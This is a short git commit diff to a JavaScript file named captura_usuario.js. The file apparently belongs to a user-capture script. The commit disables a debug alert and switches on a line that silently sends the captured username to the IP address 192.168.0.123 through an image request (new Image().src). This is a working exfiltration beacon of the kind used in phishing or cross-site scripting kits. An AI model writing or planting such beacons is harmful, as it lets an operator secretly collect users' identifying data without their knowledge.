a70cfa9612cc7761cdb9033abe96f07c2ce6a4d7
rodrigorochapinto <46836803+rodrigorochapinto@users.noreply.github.com>
2019-01-21 07:18:59 -0200

    Update captura_usuario.js

--- js/captura_usuario.js
+++ js/captura_usuario.js
@@ -7,11 +7,11 @@ str = array.usuario
 var busca = "%20"; 
 var strbusca = eval('/'+busca+'/g');
 str2 = str.replace(strbusca, " ");
-alert(str2);
+//alert(str2);
 
 
 
 //alert('captura usuario / editar arquivo captura_usuario.js')
 
 
-// new Image().src = "http://192.168.0.123/?=" + retorno
+new Image().src = "http://192.168.0.123/?=" + str2
